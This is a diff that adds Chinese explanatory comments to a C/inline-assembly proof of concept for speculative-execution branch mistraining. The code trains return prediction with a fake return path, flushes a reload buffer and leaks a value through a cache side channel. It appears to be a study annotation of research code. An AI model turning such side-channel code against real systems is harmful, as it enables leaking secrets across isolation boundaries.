@@ -25,6 +25,7 @@ __attribute__((aligned(4096))) static u64 results[RB_SLOTS] = {0};
 
 // discloure gadget. leak content of "rdi", which is number 0 -- RB_SLOTS
 void train_dst();
+// RB_PTR + (rdi << RB_STRIDE_BITS)被加载进 cache。
 asm(
     ".align 0x1000\n\t"
     "train_dst:\n\t"
@@ -73,6 +74,13 @@ static void print_results(u64 *results, int n) {
  *  jmp*    |  Y  |  Y
  *
  */
+//  512 KB对齐
+// C + inline asm 里是一个经典技巧;“符号标号”;用于 拷贝一段精确的机器指令模板
+// lfence:阻止后续指令推测执行;mfence:阻止内存乱序
+// %r8 = 间接跳转目标地址指针
+// push (%r8):push *r8;推的是 返回地址（fake return target）
+
+// ret 的行为是：RIP ← *(RSP);RSP += 8
 void br_src_training_tmpl_end();
 void br_src_training_tmpl();
 asm(
@@ -123,27 +131,33 @@ int main(int argc, char *argv[])
     u64 br_src_training_sz = br_src_training_tmpl_end - br_src_training_tmpl;
     u64 br_src_mispredict_sz = br_src_mispredict_tmpl_end - br_src_mispredict_tmpl;
 
+    // addr & ~0xfff-页对齐（4KB）;mmap() 要求：起始地址是 page-aligned,否则直接 EINVAL;
     MAP_OR_DIE((u8*)(TRAIN_PATH & ~0xfff), 0x1000, PROT_RWX, MMAP_FLAGS, -1, 0);
+    // C3 = ret
     memcpy((u8*)TRAIN_PATH, "\xc3", 1); // ret;
     MAP_OR_DIE((u8*)(BR_SRC1 & ~0xfff), PG_ROUND(br_src_training_sz), PROT_RWX, MMAP_FLAGS, -1, 0);
     MAP_OR_DIE((u8*)(BR_SRC2 & ~0xfff), PG_ROUND(br_src_mispredict_sz), PROT_RWX, MMAP_FLAGS, -1, 0);
+    // 它们不是正常函数，而是被 ret 间接跳转到的代码块
     memcpy((u8 *)BR_SRC1, br_src_training_tmpl, br_src_training_sz);
     memcpy((u8 *)BR_SRC2, br_src_mispredict_tmpl, br_src_mispredict_tmpl_end-br_src_mispredict_tmpl);
+    // ret_path 里的每个元素都会被 pushq (ret_path[i]) ;CPU 真的会去执行那个地址 ;预测可以错，但内存必须是 valid 的
     for (int i = 0; i < RET_PATH_LENGTH; ++i) {
         ret_path[i] = TRAIN_PATH;
     }
 
     for (int i = 0; i<ROUNDS; ++i) {
+        // 它会访问 reload buffer
         dst_ptr = (u64)train_dst; // activate CL
         for (int j = 0; j < 3; ++j){
+            // pushq:q = quadword = 64-bit;在 x86-64 下是默认，但显式写更严谨
             asm(
                     "mov %0, %%r8\n\t"
                     "mov $0x2, %%rdi\n\t" // can be anything in bounds of RB
                     "pushq %[br_src]\n\t"
                     "mov %[retp], %%r10 \n\t"
                     ".rept " xstr(RET_PATH_LENGTH) "\n\t"
-                    "pushq (%%r10)\n\t"
-                    "add $8, %%r10\n\t"
+                        "pushq (%%r10)\n\t"
+                        "add $8, %%r10\n\t"
                     ".endr\n\t"
                     "ret\n\t" :: "r"(&dst_ptr), [retp]"r"(ret_path), [br_src]"r"(BR_SRC1) : "rax", "rdi", "r8", "r10"
                );
@@ -155,14 +169,15 @@ int main(int argc, char *argv[])
         // executed
         dst_ptr = (u64)spec_dst;
         flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS); 
+        // 人为构造一条“很深的 return 历史”
         asm(
             "mov %0, %%r8\n\t"
             "mov $"xstr(SECRET)", %%rdi\n\t"
             "pushq %[br_src]\n\t"
             "mov %[retp], %%r10 \n\t"
             ".rept " xstr(RET_PATH_LENGTH) "\n\t"
-            "pushq (%%r10)\n\t"
-            "add $8, %%r10\n\t"
+                "pushq (%%r10)\n\t"
+                "add $8, %%r10\n\t"
             ".endr\n\t"
             "ret\n\t"
             :: "r"(&dst_ptr), [retp]"r"(ret_path), [br_src]"r"(BR_SRC2): "rax", "rdi", "r8", "r10"
